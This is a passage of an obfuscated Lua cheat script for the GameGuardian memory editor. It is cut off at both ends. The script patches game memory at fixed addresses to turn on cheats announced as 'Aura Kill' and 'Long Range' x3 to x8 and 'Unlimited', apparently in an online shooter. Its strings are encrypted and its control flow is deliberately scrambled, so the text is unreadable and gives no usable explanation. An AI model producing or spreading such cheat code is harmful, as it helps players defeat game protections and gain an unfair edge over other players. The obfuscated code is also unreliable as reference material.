,v7(""\148\137\195\142\126\170\158\137\195\250\124\170\229\137\195\142\125\170\147\255\195\250\120"",""\138\166\185\227\190\78""));gg.setVisible(false);v12(v7(""\199\125\199\62\94\113\26\219\100\139\36\93"",""\121\171\20\165\87\50\67""),18814060,v7(""\229\104\249\102\234\66\147\30\249\18\239"",""\98\166\88\217\86\217""));gg.setVisible(false);gg.clearResults();gg.clearList();v12(v7(""\250\255\123\8\138\142\245\230\105\79\149\211"",""\188\150\150\25\97\230""),61639876 -42887984 ,v7(""\136\217\31\82\92\173\130\217\31\38\94\173\249\217\31\82\95\173\143\175\31\38\90"",""\141\186\233\63\98\108""));gg.setVisible(false);v29=1090 -(507 + 559) ;end if (v29==(32 -19)) then local v49=0 -0 ;while true do if (v49==(389 -(212 + 176))) then local v73=905 -(250 + 655) ;while true do if (v73==(0 -0)) then gg.setVisible(false);v12(v7(""\74\115\86\7\63\20\121\68\30\125\85\117"",""\83\38\26\52\110""),22846321 -9771537 ,v7(""\123\71\103\22\11\87\114\96\24\51\113"",""\38\56\119\71""));v73=1;end if (v73==1) then v49=2 -0 ;break;end end end if (v49==(1959 -(1869 + 87))) then local v74=0 -0 ;while true do if (v74==(1902 -(484 + 1417))) then v49=8 -4 ;break;end if (v74==(0 -0)) then gg.setVisible(false);v12(v7(""\39\27\42\92\135\213\193\59\2\102\70\132"",""\162\75\114\72\53\235\231""),13075524,v7(""\175\108\4\178\0\66\217\26\4\198\5"",""\98\236\92\36\130\51""));v74=1;end end end if (v49==(773 -(48 + 725))) then gg.setVisible(false);v12(v7(""\191\90\200\121\22\111\86\209\163\29\217\127"",""\161\211\51\170\16\122\93\53""),21347437 -8279749 ,v7(""\216\254\242\120\168\238\231\14\187\138\228"",""\72\155\206\210""));v49=2 -1 ;end if (v49==4) then gg.setVisible(false);v29=9 + 5 ;break;end if (v49==(4 -2)) then gg.setVisible(false);v12(v7(""\255\230\90\223\41\4\240\255\72\152\54\89"",""\54\147\143\56\182\69""),3659229 + 9415935 ,v7(""\245\209\191\25\140\150\212\217\9\251\128"",""\191\182\225\159\41""));v49=1 + 2 ;end end end if (v29==(875 -(152 + 701))) then local v50=0;local v51;while true do if (v50==0) then v51=1311 -(430 + 881) ;while true do if (v51==(0 + 0)) then local v86=0;while true do if (v86==0) then gg.clearResults();gg.clearList();v86=896 -(557 + 338) ;end if (v86==(1 + 0)) then v51=2 -1 ;break;end end end if (v51==4) then v12(v7(""\235\51\233\121\235\104\232\96\247\116\248\127"",""\16\135\90\139""),65661762 -46910854 ,v7(""\6\36\70\99\30\20\32\4\52\34\97\14\119\40\20\36\85\115\27\114\56\112\34"",""\24\52\20\102\83\46\52""));v29=23;break;end if (v51==3) then gg.clearResults();gg.clearList();v51=10 -6 ;end if (v51==2) then v12(v7(""\56\185\33\239\56\226\32\246\36\254\48\233"",""\134\84\208\67""),40818971 -21878887 ,v7(""\48\252\198\12\64\236\211\122\83\136\208"",""\60\115\204\230""));gg.setVisible(false);v51=804 -(499 + 302) ;end if (v51==(867 -(39 + 827))) then v12(v7(""\15\86\193\242\15\13\192\235\19\17\208\244"",""\155\99\63\163""),18940072,v7(""\161\129\225\221\234\196\215\247\225\169\239"",""\228\226\177\193\237\217""));gg.setVisible(false);v51=5 -3 ;end end break;end end end if (v29==(19 -10)) then local v52=0 -0 ;while true do if (v52==2) then gg.setVisible(false);v12(v7(""\61\139\126\181\61\208\127\172\33\204\111\179"",""\220\81\226\28""),20047535 -6989891 ,v7(""\48\133\194\171\185\135\70\243\194\223\188"",""\167\115\181\226\155\138""));v52=3;end if (v52==1) then gg.setVisible(false);v12(v7(""\206\136\20\247\53\188\91\210\145\88\237\54"",""\56\162\225\118\158\89\142""),1117663 + 11938073 ,v7(""\127\85\128\255\113\152\9\35\128\139\116"",""\184\60\101\160\207\66""));v52=5 -3 ;end if ((0 + 0)==v52) then gg.setVisible(false);v12(v7(""\241\196\22\220\66\229\254\221\4\155\93\184"",""\215\157\173\116\181\46""),20659880 -7603832 ,v7(""\22\228\203\162\137\117\225\173\178\254\99"",""\186\85\212\235\146""));v52=1;end if (v52==(107 -(103 + 1))) then gg.setVisible(false);v12(v7(""\238\43\229\85\119\35\197\242\50\169\79\116"",""\166\130\66\135\60\27\17""),13057964,v7(""\103\26\142\37\99\4\31\232\53\20\18"",""\80\36\42\174\21""));v52=4;end if (v52==(558 -(475 + 79))) then gg.setVisible(false);v29=21 -11 ;break;end end end if (v29==(9 -6)) then gg.setVisible(false);v12(v7(""\128\12\93\79\232\19\227\156\21\17\85\235"",""\128\236\101\63\38\132\33""),2133068 + 14372116 ,v7(""\143\249\81\20\229\171\154\138\233\53\18"",""\175\204\201\113\36\214\139""));gg.setVisible(false);v12(v7(""\75\197\55\213\8\21\207\37\204\74\84\195"",""\100\39\172\85\188""),14526877 + 1979579 ,v7(""\142\40\249\208\96\237\45\159\192\23\251"",""\83\205\24\217\224""));gg.setVisible(false);v12(v7(""\234\204\207\52\234\151\206\45\246\139\222\50"",""\93\134\165\173""),16508047 -(1395 + 108) ,v7(""\157\162\129\146\105\142\231\88\254\214\151"",""\30\222\146\161\162\90\174\210""));gg.setVisible(false);v12(v7(""\233\71\114\3\233\28\115\26\245\0\99\5"",""\106\133\46\16""),16516340,v7(""\123\112\51\172\9\0\13\6\51\216\12"",""\32\56\64\19\156\58""));gg.setVisible(false);v29=11 -7 ;end if (v29==(1220 -(7 + 1197))) then v12(v7(""\142\71\93\86\188\155\93\146\94\17\76\191"",""\62\226\46\63\63\208\169""),5704552 + 7378936 ,v7(""\198\73\21\211\76\77\122\120\165\61\3"",""\62\133\121\53\227\127\109\79""));gg.setVisible(false);v12(v7(""\28\29\48\252\218\252\161\0\4\124\230\217"",""\194\112\116\82\149\182\206""),13083604,v7(""\26\248\12\72\147\162\91\31\232\104\78"",""\110\89\200\44\120\160\130""));gg.setVisible(false);v12(v7(""\167\202\73\79\79\24\56\93\187\141\88\73"",""\45\203\163\43\38\35\42\91""),13083756,v7(""\241\213\156\115\212\233\1\244\197\248\117"",""\52\178\229\188\67\231\201""));gg.setVisible(false);v12(v7(""\45\72\82\13\251\14\32\49\81\30\23\248"",""\67\65\33\48\100\151\60""),4565368 + 8518504 ,v7(""\252\183\238\136\160\159\178\136\152\215\137"",""\147\191\135\206\184""));gg.setVisible(false);gg.clearList();v29=17;end if (v29==24) then gg.clearResults();gg.clearList();v12(v7(""\253\227\46\191\41\163\233\60\166\107\226\229"",""\69\145\138\76\214""),20715163 -(27 + 292) ,v7(""\34\159\201\217\239\86\40\159\201\173\237\86\83\159\201\217\236\86\37\233\201\173\233"",""\118\16\175\233\233\223""));gg.setVisible(false);gg.clearResults();gg.setVisible(false);gg.setVisible(false);v12(v7(""\135\141\55\178\226\217\126\155\148\123\168\225"",""\29\235\228\85\219\142\235""),20863240,v7(""\30\132\250\141\36\14\114\116\125\240\236"",""\50\93\180\218\189\23\46\71""));gg.clearResults();v29=72 -47 ;end if (v29==(19 -4)) then local v53=0 -0 ;while true do if (v53==(7 -3)) then gg.setVisible(false);v29=30 -14 ;break;end if (v53==(142 -(43 + 96))) then gg.setVisible(false);v12(v7(""\255\10\43\25\142\10\27\102\227\77\58\31"",""\22\147\99\73\112\226\56\120""),53368692 -40285320 ,v7(""\155\37\162\165\222\248\32\196\181\169\238"",""\237\216\21\130\149""));v53=8 -4 ;end if (v53==(0 + 0)) then gg.setVisible(false);v12(v7(""\210\174\199\212\127\163\94\30\206\233\214\210"",""\110\190\199\165\189\19\145\61""),3692996 + 9385952 ,v7(""\249\187\55\184\216\135\143\205\55\204\221"",""\167\186\139\23\136\235""));v53=1 -0 ;end if (v53==(1 + 0)) then gg.setVisible(false);v12(v7(""\22\188\138\4\22\231\139\29\10\251\155\2"",""\109\122\213\232""),24510649 -11432065 ,v7(""\205\167\226\96\189\183\247\22\174\211\244"",""\80\142\151\194""));v53=2;end if ((1 + 1)==v53) then gg.setVisible(false);v12(v7(""\15\207\117\69\15\148\116\92\19\136\100\67"",""\44\99\166\23""),959364 + 12123892 ,v7(""\95\167\105\102\96\228\41\209\105\18\101"",""\196\28\151\73\86\83""));v53=1754 -(1414 + 337) ;end end end if (v29==26) then gg.clearResults();gg.setVisible(false);gg.toast(""☑️Aura Kill Activated☑️"");break;end if (v29==(1961 -(1642 + 298))) then local v54=0 -0 ;while true do if (v54==(11 -7)) then gg.setVisible(false);v29=22;break;end if (0==v54) then gg.setVisible(false);v12(v7(""\68\120\182\247\201\26\114\164\238\139\91\126"",""\165\40\17\212\158""),18882412,v7(""\198\137\72\99\117\165\140\46\115\2\179"",""\70\133\185\104\83""));v54=2 -1 ;end if ((1 + 2)==v54) then gg.setVisible(false);v12(v7(""\196\83\12\36\21\138\172\147\216\20\29\34"",""\227\168\58\110\77\121\184\207""),14736212 + 4203852 ,v7(""\88\108\255\16\226\155\36\131\59\24\233"",""\197\27\92\223\32\209\187\17""));v54=976 -(357 + 615) ;end if (v54==(1 + 0)) then gg.setVisible(false);gg.clearResults();v54=4 -2 ;end if (v54==(2 + 0)) then gg.clearList();v12(v7(""\8\76\70\35\197\86\70\84\58\135\23\74"",""\169\100\37\36\74""),40589432 -21649368 ,v7(""\35\215\226\0\83\199\247\118\64\163\244"",""\48\96\231\194""));v54=3;end end end if (v29==(15 + 3)) then local v55=0 + 0 ;while true do if (v55==(3 + 1)) then v12(v7(""\91\81\6\215\91\10\7\206\71\22\23\209"",""\190\55\56\100""),19795096,v7(""\117\255\124\78\64\163\166\112\239\24\72"",""\147\54\207\92\126\115\131""));v29=19;break;end if (v55==(1302 -(384 + 917))) then v12(v7(""\87\9\143\2\41\93\18\187\75\78\158\4"",""\203\59\96\237\107\69\111\113""),18935037 -(128 + 569) ,v7(""\7\70\236\177\98\176\130\2\86\136\183"",""\183\68\118\204\129\81\144""));gg.setVisible(false);v55=1545 -(1407 + 136) ;end if (v55==(1889 -(687 + 1200))) then v12(v7(""\2\164\114\237\7\208\13\189\96\170\24\141"",""\226\110\205\16\132\107""),18942026 -(556 + 1154) ,v7(""\200\147\160\137\18\171\150\198\153\101\189"",""\33\139\163\128\185""));gg.setVisible(false);v55=10 -7 ;end if (v55==(98 -(9 + 86))) then gg.clearResults();gg.clearList();v55=425 -(275 + 146) ;end if (v55==(0 + 0)) then gg.clearList();gg.setVisible(false);v55=65 -(29 + 35) ;end end end if (v29==(22 -17)) then gg.setVisible(false);v12(v7(""\166\193\15\194\201\241\212\241\186\134\30\196"",""\129\202\168\109\171\165\195\183""),49384887 -32851235 ,v7(""\1\8\119\136\141\84\179\4\24\19\142"",""\134\66\56\87\184\190\116""));gg.setVisible(false);v12(v7(""\48\56\11\178\21\185\34\37\44\127\26\180"",""\85\92\81\105\219\121\139\65""),72991108 -56456772 ,v7(""\222\227\16\21\47\159\168\149\16\97\42"",""\191\157\211\48\37\28""));gg.setVisible(false);v12(v7(""\211\22\246\21\54\141\28\228\12\116\204\16"",""\90\191\127\148\124""),10769908 + 5765440 ,v7(""\91\215\110\71\43\199\123\49\56\163\120"",""\119\24\231\78""));gg.setVisible(false);v12(v7(""\142\36\167\67\208\18\18\146\61\235\89\211"",""\113\226\77\197\42\188\32""),16536448 -(53 + 959) ,v7(""\25\70\180\229\105\86\161\147\122\50\162"",""\213\90\118\148""));gg.setVisible(false);v29=6;end if (v29==(422 -(312 + 96))) then v12(v7(""\168\16\14\179\73\250\182\32\180\87\31\181"",""\80\196\121\108\218\37\200\213""),13075936,v7(""\35\35\66\47\24\78\223\38\51\38\41"",""\234\96\19\98\31\43\110""));gg.setVisible(false);v12(v7(""\10\22\80\206\160\32\136\22\15\28\212\163"",""\235\102\127\50\167\204\18""),13076440,v7(""\115\241\181\115\23\110\5\135\181\7\18"",""\78\48\193\149\67\36""));gg.setVisible(false);v12(v7(""\60\23\130\17\77\98\29\144\8\15\35\17"",""\33\80\126\224\120""),13076516,v7(""\207\248\67\148\15\172\253\37\132\120\186"",""\60\140\200\99\164""));gg.setVisible(false);v12(v7(""\139\253\6\47\174\213\247\20\54\236\148\251"",""\194\231\148\100\70""),22694770 -9619022 ,v7(""\101\28\129\243\165\136\19\106\129\135\160"",""\168\38\44\161\195\150""));gg.setVisible(false);v12(v7(""\140\245\128\127\60\186\181\6\144\178\145\121"",""\118\224\156\226\22\80\136\214""),13079349 -(147 + 138) ,v7(""\97\190\25\208\17\174\12\166\2\202\15"",""\224\34\142\57""));v29=15;end if (7==v29) then gg.setVisible(false);v12(v7(""\13\59\4\51\81\83\49\22\42\19\18\61"",""\61\97\82\102\90""),13089659 -(813 + 86) ,v7(""\143\126\235\27\148\23\75\47\236\10\253"",""\105\204\78\203\43\167\55\126""));gg.setVisible(false);v12(v7(""\169\163\33\23\31\86\196\65\181\228\48\17"",""\49\197\202\67\126\115\100\167""),13088772,v7(""\20\11\159\121\211\22\11\17\27\251\127"",""\62\87\59\191\73\224\54""));gg.setVisible(false);v12(v7(""\235\11\248\192\235\80\249\217\247\76\233\198"",""\169\135\98\154""),13020516,v7(""\232\39\100\4\174\115\157\237\55\0\2"",""\168\171\23\68\52\157\83""));gg.setVisible(false);v12(v7(""\248\120\247\164\41\127\132\228\97\187\190\42"",""\231\148\17\149\205\69\77""),13051432,v7(""\163\247\135\171\4\191\213\129\135\223\1"",""\159\224\199\167\155\55""));gg.setVisible(false);v29=8;end if ((10 + 1)==v29) then local v56=0;while true do if (v56==0) then gg.setVisible(false);v12(v7(""\205\27\15\252\14\34\186\209\2\67\230\13"",""\217\161\114\109\149\98\16""),13061012,v7(""\49\112\120\44\239\52\71\6\120\88\234"",""\20\114\64\88\28\220""));v56=1 -0 ;end if ((495 -(18 + 474))==v56) then gg.setVisible(false);v12(v7(""\33\199\93\226\74\157\131\61\222\17\248\73"",""\224\77\174\63\139\38\175""),4407011 + 8656105 ,v7(""\167\17\24\126\215\1\13\8\196\101\14"",""\78\228\33\56""));v56=4;end if (v56==(6 -4)) then gg.setVisible(false);v12(v7(""\136\200\2\176\51\99\203\148\209\78\170\48"",""\168\228\161\96\217\95\81""),13061374 -(860 + 226) ,v7(""\248\129\110\12\124\23\142\247\110\120\121"",""\55\187\177\78\60\79""));v56=306 -(121 + 182) ;end if (v56==(1 + 0)) then gg.setVisible(false);v12(v7(""\61\8\208\189\244\130\190\33\17\156\167\247"",""\221\81\97\178\212\152\176""),13062320 -(988 + 252) ,v7(""\238\183\93\171\73\141\178\59\187\62\155"",""\122\173\135\125\155""));v56=1 + 1 ;end if (v56==4) then gg.setVisible(false);v29=4 + 8 ;break;end end end if (v29==0) then gg.clearResults();gg.setVisible(false);gg.clearList();gg.clearResults();gg.setVisible(false);gg.setVisible(false);gg.clearResults();gg.setVisible(false);v12(v7(""\0\199\92\123\114\37\240\247\28\128\77\125"",""\135\108\174\62\18\30\23\147""),19248732,v7(""\149\185\106\155\75\238\102\225\246\205\124"",""\167\214\137\74\171\120\206\83""));v29=1;end if ((1972 -(49 + 1921))==v29) then v12(v7(""\180\224\217\205\180\187\216\212\168\167\200\203"",""\164\216\137\187""),20081230 -(223 + 667) ,v7(""\241\182\113\226\245\190\94\244\166\21\228"",""\107\178\134\81\210\198\158""));gg.setVisible(false);v12(v7(""\52\7\128\207\166\106\13\146\214\228\43\1"",""\202\88\110\226\166""),20080424 -(51 + 1) ,v7(""\224\95\194\167\153\131\90\164\183\238\149"",""\170\163\111\226\151""));gg.setVisible(false);v12(v7(""\29\57\176\49\66\101\42\1\32\252\43\65"",""\73\113\80\210\88\46\87""),20935812,v7(""\162\124\141\66\180\193\121\235\82\195\215"",""\135\225\76\173\114""));gg.setVisible(false);v12(v7(""\22\228\186\185\160\239\164\10\253\246\163\163"",""\199\122\141\216\208\204\221""),28407292 -11902796 ,v7(""\142\141\80\160\43\182\248\251\80\212\46"",""\150\205\189\112\144\24""));gg.setVisible(false);v12(v7(""\41\141\189\69\8\218\18\0\53\202\172\67"",""\112\69\228\223\44\100\232\113""),16504504,v7(""\247\79\71\131\229\60\211\242\95\35\133"",""\230\180\127\103\179\214\28""));v29=6 -3 ;end if (v29==(1129 -(146 + 979))) then v12(v7(""\86\193\231\95\86\160\131\74\216\171\69\85"",""\224\58\168\133\54\58\146""),4661445 + 11854903 ,v7(""\122\6\11\173\38\198\210\45\25\114\29"",""\107\57\54\43\157\21\230\231""));gg.setVisible(false);v12(v7(""\215\130\19\252\181\142\204\203\155\95\230\182"",""\175\187\235\113\149\217\188""),16517637 -(311 + 294) ,v7(""\31\255\193\28\176\57\45\26\239\165\26"",""\24\92\207\225\44\131\25""));gg.setVisible(false);v12(v7(""\71\218\186\69\23\47\72\195\168\2\8\114"",""\29\43\179\216\44\123""),46061620 -29544316 ,v7(""\158\137\96\28\238\153\117\106\253\253\118"",""\44\221\185\64""));gg.setVisible(false);v12(v7(""\13\238\74\86\127\83\228\88\79\61\18\232"",""\19\97\135\40\63""),6996554 + 9520838 ,v7(""\141\12\115\107\124\113\251\122\115\31\121"",""\81\206\60\83\91\79""));gg.setVisible(false);v12(v7(""\66\162\210\123\35\145\78\180\94\229\195\125"",""\196\46\203\176\18\79\163\45""),16535087 -(496 + 947) ,v7(""\155\114\62\78\119\187\186\158\98\90\72"",""\143\216\66\30\126\68\155""));v29=1363 -(1233 + 125) ;end if ((7 + 10)==v29) then local v57=0;while true do if (4==v57) then gg.clearResults();v29=18;break;end if (v57==(1 + 0)) then gg.clearList();gg.clearResults();v57=1 + 1 ;end if (v57==(1648 -(963 + 682))) then gg.setVisible(false);v12(v7(""\136\33\164\200\212\1\177\148\56\232\210\215"",""\210\228\72\198\161\184\51""),15798578 + 3132714 ,v7(""\21\25\179\64\32\142\99\111\179\52\37"",""\174\86\41\147\112\19""));v57=1508 -(504 + 1000) ;end if (v57==(2 + 0)) then local v75=0 + 0 ;while true do if (v75==0) then gg.setVisible(false);gg.clearResults();v75=1 + 0 ;end if (v75==(1 -0)) then v57=3 + 0 ;break;end end end if (v57==(0 + 0)) then local v76=0;while true do if ((183 -(156 + 26))==v76) then v57=1 + 0 ;break;end if (v76==(0 -0)) then gg.clearResults();gg.setVisible(false);v76=1;end end end end end if (v29==(165 -(149 + 15))) then local v58=0;local v59;while true do if (v58==0) then v59=960 -(890 + 70) ;while true do if (v59==(118 -(39 + 78))) then gg.setVisible(false);v12(v7(""\203\93\114\29\181\76\196\68\96\90\170\17"",""\126\167\52\16\116\217""),19249234 -(14 + 468) ,v7(""\235\126\96\208\231\89\169\238\110\4\214"",""\156\168\78\64\224\212\121""));v59=4 -2 ;end if (v59==(8 -5)) then gg.setVisible(false);v12(v7(""\216\205\236\85\216\150\237\76\196\138\253\83"",""\60\180\164\142""),9932371 + 9318181 ,v7(""\123\14\69\121\116\173\71\126\30\33\127"",""\114\56\62\101\73\71\141""));v59=3 + 1 ;end if (v59==(0 + 0)) then gg.setVisible(false);v12(v7(""\135\249\48\84\244\245\136\224\34\19\235\168"",""\199\235\144\82\61\152""),8693168 + 10555572 ,v7(""\36\70\249\123\84\86\236\13\71\50\239"",""\75\103\118\217""));v59=1 + 0 ;end if (v59==(7 -3)) then gg.setVisible(false);v29=2;break;end if (v59==(2 + 0)) then gg.setVisible(false);v12(v7(""\11\231\167\199\11\188\166\222\23\160\182\193"",""\174\103\142\197""),67640381 -48391621 ,v7(""\117\120\31\104\118\30\173\112\104\123\110"",""\152\54\72\63\88\69\62""));v59=3;end end break;end end end if (v29==(1 + 11)) then local v60=51 -(12 + 39) ;while true do if (v60==(0 + 0)) then v12(v7(""\194\119\176\10\137\156\125\162\19\203\221\113"",""\229\174\30\210\99""),40435726 -27372290 ,v7(""\56\189\198\1\190\125\108\61\173\162\7"",""\89\123\141\230\49\141\93""));gg.setVisible(false);v60=1;end if (v60==(10 -7)) then v12(v7(""\82\202\247\236\32\146\93\211\229\171\63\207"",""\160\62\163\149\133\76""),3872787 + 9190865 ,v7(""\245\240\77\127\144\150\245\43\111\231\128"",""\163\182\192\109\79""));gg.setVisible(false);v60=3 + 1 ;end if (v60==(9 -5)) then v12(v7(""\56\47\2\201\249\102\37\16\208\187\39\41"",""\149\84\70\96\160""),8702537 + 4363247 ,v7(""\27\86\77\189\107\70\88\203\120\34\91"",""\141\88\102\109""));v29=62 -49 ;break;end if (v60==(1712 -(1596 + 114))) then v12(v7(""\14\0\165\95\177\182\20\185\18\71\180\89"",""\201\98\105\199\54\221\132\119""),13064356,v7(""\154\92\195\113\81\117\249\159\76\167\119"",""\204\217\108\227\65\98\85""));gg.setVisible(false);v60=7 -4 ;end if (1==v60) then v12(v7(""\255\120\244\5\28\24\240\97\230\66\3\69"",""\42\147\17\150\108\112""),13063856,v7(""\44\246\109\47\180\168\90\128\109\91\177"",""\136\111\198\77\31\135""));gg.setVisible(false);v60=715 -(164 + 549) ;end end end end break;end end end function LONG()local v30=1438 -(1059 + 379) ;local v31;while true do if (v30==(0 -0)) then v31=0;while true do if (v31==(1 + 0)) then if (N==nil) then else local v65=0;local v66;while true do if (v65==0) then v66=0 + 0 ;while true do if ((392 -(145 + 247))==v66) then if (N==1) then local v90=0;while true do if (v90==(0 + 0)) then v12(v7(""\225\247\15\230\246\222\249\231\67\224\247"",""\183\141\158\109\147\152""),16306028,v7(""\124\89\166\92\124\73\178\92\108\93\182"",""\108\76\105\134""));v12(v7(""\231\204\179\244\192\226\209\168\175\221\228"",""\174\139\165\209\129""),7534661 + 8771371 ,v7(""\243\227\162\145\150\67\36\40\227\231\178"",""\24\195\211\130\161\166\99\16""));v90=2 -1 ;end if (v90==(1 + 0)) then v12(v7(""\74\10\235\57\93\31\82\26\167\63\92"",""\118\38\99\137\76\51""),16306036,v7(""\173\118\69\66\89\96\169\118\69\70\89"",""\64\157\70\101\114\105""));v12(v7(""\76\161\165\246\30\73\188\190\173\3\79"",""\112\32\200\199\131""),16306040,v7(""\124\0\28\232\147\235\118\124\16\8\232"",""\66\76\48\60\216\163\203""));v90=2 + 0 ;end if (v90==(2 -0)) then gg.toast(""Long Range x3 Activated☑️"");break;end end end if (N==2) then local v91=720 -(254 + 466) ;while true do if (v91==1) then v12(v7(""\136\94\252\79\138\94\234\67\202\68\241"",""\58\228\55\158""),16306036,v7(""\228\217\144\126\108\237\109\228\201\132\126"",""\85\212\233\176\78\92\205""));v12(v7(""\70\81\138\247\68\81\156\251\4\75\135"",""\130\42\56\232""),16306600 -(544 + 16) ,v7(""\186\229\100\179\16\127\178\229\100\183\16"",""\95\138\213\68\131\32""));v91=2;end if (2==v91) then gg.toast(""Long Range x4 Activated☑️"");break;end if (v91==(0 -0)) then local v101=628 -(294 + 334) ;while true do if (v101==(254 -(236 + 17))) then v91=1 + 0 ;break;end if (v101==(0 + 0)) then v12(v7(""\182\143\123\230\81\199\48\163\200\106\252"",""\68\218\230\25\147\63\174""),16306028,v7(""\253\122\19\28\230\237\114\3\12\226\253"",""\214\205\74\51\44""));v12(v7(""\246\69\224\233\121\243\88\251\178\100\245"",""\23\154\44\130\156""),61410318 -45104286 ,v7(""\65\246\237\254\102\83\73\246\237\250\102"",""\115\113\198\205\206\86""));v101=4 -3 ;end end end end end if (N==(2 + 1)) then local v92=0 + 0 ;local v93;local v94;while true do if (v92==(794 -(413 + 381))) then v93=0 + 0 ;v94=nil;v92=1;end if (v92==1) then while true do if (v93==(0 -0)) then v94=0 -0 ;while true do if (v94==(1970 -(582 + 1388))) then v12(v7(""\38\33\163\86\120\35\60\184\13\101\37"",""\22\74\72\193\35""),16306036,v7(""\124\41\164\8\124\57\197\8\108\45\180"",""\56\76\25\132""));v12(v7(""\82\200\169\51\193\87\213\178\104\220\81"",""\175\62\161\203\70""),16306040,v7(""\108\141\131\67\101\124\252\147\83\97\108"",""\85\92\189\163\115""));v94=1;end if ((2 -0)==v94) then gg.toast(""Long Range x5 Activated☑️"");break;end if (v94==1) then local v118=0;while true do if (1==v118) then v94=2 + 0 ;break;end if (v118==(364 -(326 + 38))) then local v124=0;while true do if ((2 -1)==v124) then v118=1 -0 ;break;end if (0==v124) then v12(v7(""\37\165\50\45\39\165\36\33\103\191\63"",""\88\73\204\80""),16306032,v7(""\126\211\80\22\121\154\15\211\80\18\121"",""\186\78\227\112\38\73""));v12(v7(""\240\94\255\64\93\115\232\78\179\70\92"",""\26\156\55\157\53\51""),16306648 -(47 + 573) ,v7(""\220\136\86\137\232\16\173\136\86\141\232"",""\48\236\184\118\185\216""));v124=1 + 0 ;end end end end end end break;end end break;end end end v66=1;end if (v66==5) then if (N==(67 -51)) then local v95=0 -0 ;while true do if (v95==(1666 -(1269 + 395))) then gg.toast(""Unlimited Long Range Activated☑️"");break;end if (v95==0) then local v102=492 -(76 + 416) ;while true do if (v102==(444 -(319 + 124))) then v95=2 -1 ;break;end if (v102==(1007 -(564 + 443))) then local v116=0 -0 ;while true do if ((459 -(337 + 121))==v116) then v102=1;break;end if (v116==(0 -0)) then v12(v7(""\40\6\160\82\42\6\182\94\106\28\173"",""\39\68\111\194""),54317950 -38011910 ,v7(""\129\254\167\159\47\247\134\241\167\145\45"",""\215\182\198\135\167\25""));v12(v7(""\129\64\232\93\131\64\254\81\195\90\229"",""\40\237\41\138""),16306032,v7(""\144\44\186\160\28\135\36\173\184\28\147"",""\42\167\20\154\152""));v116=1912 -(1261 + 650) ;end end end end end if (v95==(1 + 0)) then local v103=0 -0 ;local v104;while true do if (v103==0) then v104=1817 -(772 + 1045) ;while true do if (v104==1) then v95=2;break;end if (v104==(0 + 0)) then local v119=144 -(102 + 42) ;while true do if (v119==1) then v104=1845 -(1524 + 320) ;break;end if (v119==(1270 -(1049 + 221))) then v12(v7(""\70\247\160\87\127\40\94\231\236\81\126"",""\65\42\158\194\34\17""),16306036,v7(""\77\127\18\84\123\173\75\185\90\113\6"",""\142\122\71\50\108\77\141\123""));v12(v7(""\25\171\253\13\53\28\182\230\86\40\26"",""\91\117\194\159\120""),16306184 -(18 + 138) ,v7(""\77\69\126\64\99\177\116\77\93\104\76"",""\68\122\125\94\120\85\145""));v119=1;end end end end break;end end end end end break;end if (v66==(2 -1)) then local v87=0;while true do if (v87==0) then if (N==(1106 -(67 + 1035))) then v12(v7(""\233\180\85\37\193\61\241\164\25\35\192"",""\84\133\221\55\80\175""),16306388 -(136 + 212) ,v7(""\237\183\100\246\151\28\158\183\100\242\151"",""\60\221\135\68\198\167""));v12(v7(""\226\180\250\150\76\208\250\164\182\144\77"",""\185\142\221\152\227\34""),16306036,v7(""\8\149\23\170\19\115\212\8\133\3\170"",""\151\56\165\55\154\35\83""));v12(v7(""\172\74\7\251\174\74\17\247\238\80\10"",""\142\192\35\101""),69290916 -52984884 ,v7(""\134\37\105\243\183\204\143\70\150\33\121"",""\118\182\21\73\195\135\236\204""));v12(v7(""\4\53\24\85\10\4\233\17\114\9\79"",""\157\104\92\122\32\100\109""),13063126 + 3242902 ,v7(""\243\246\143\154\109\103\174\251\227\242\159"",""\203\195\198\175\170\93\71\237""));gg.toast(""Long Range x6 Activated☑️"");end if (N==5) then local v105=0 + 0 ;local v106;while true do if (v105==(1604 -(240 + 1364))) then v106=0;while true do if ((1084 -(1050 + 32))==v106) then gg.toast(""Long Range x7 Activated☑️"");break;end if (v106==(3 -2)) then local v120=0;while true do if (1==v120) then v106=2 + 0 ;break;end if (v120==(1055 -(331 + 724))) then v12(v7(""\181\199\210\42\65\176\218\201\113\92\182"",""\47\217\174\176\95""),16306028,v7(""\232\141\54\82\226\20\93\118\248\137\38"",""\70\216\189\22\98\210\52\24""));v12(v7(""\214\214\161\146\221\211\203\186\201\192\213"",""\179\186\191\195\231""),16306032,v7(""\169\111\88\180\169\127\61\180\185\107\72"",""\132\153\95\120""));v120=1 + 0 ;end end end if (0==v106) then v12(v7(""\34\66\60\192\95\24\232\55\5\45\218"",""\156\78\43\94\181\49\113""),16306040,v7(""\34\184\132\243\91\3\92\34\168\144\243"",""\25\18\136\164\195\107\35""));v12(v7(""\228\36\171\90\124\181\213\161\166\62\166"",""\216\136\77\201\47\18\220\161""),16306680 -(269 + 375) ,v7(""\125\188\107\138\88\156\167\125\172\127\138"",""\226\77\140\75\186\104\188""));v106=726 -(267 + 458) ;end end break;end end end v87=1 + 0 ;end if (v87==(1 -0)) then if (N==6) then local v107=0;local v108;while true do if (v107==0) then v108=0;while true do if (v108==(818 -(667 + 151))) then v12(v7(""\189\187\12\56\249\211\180\168\252\29\34"",""\192\209\210\110\77\151\186""),16307537 -(1410 + 87) ,v7(""\176\83\98\185\175\132\176\83\98\189\174"",""\164\128\99\66\137\159""));v12(v7(""\12\128\235\171\14\128\253\167\78\154\230"",""\222\96\233\137""),16307933 -(1504 + 393) ,v7(""\233\227\231\79\216\179\160\233\243\243\78"",""\144\217\211\199\127\232\147""));v108=2 -1 ;end if (1==v108) then local v121=0 -0 ;while true do if (v121==(796 -(461 + 335))) then v12(v7(""\244\38\60\61\219\76\22\93\182\60\49"",""\36\152\79\94\72\181\37\98""),2083961 + 14222071 ,v7(""\135\136\7\111\135\152\23\111\151\140\22"",""\95\183\184\39""));v12(v7(""\185\54\229\51\90\137\22\172\113\244\41"",""\98\213\95\135\70\52\224""),16307789 -(1730 + 31) ,v7(""\174\243\137\39\4\190\243\153\55\0\175"",""\52\158\195\169\23""));v121=1668 -(728 + 939) ;end if (v121==(3 -2)) then v108=2;break;end end end if (v108==(3 -1)) then gg.toast(""Long Range x8 Activated☑️"");break;end end break;end end end v66=4 -2 ;break;end end end if (v66==(1070 -(138 + 930))) then if (N==(7 + 0)) then local v96=0;while true do if (v96==(0 + 0)) then v12(v7(""\118\181\48\97\136\60\111\146\52\175\61"",""\235\26\220\82\20\230\85\27""),13974809 + 2331231 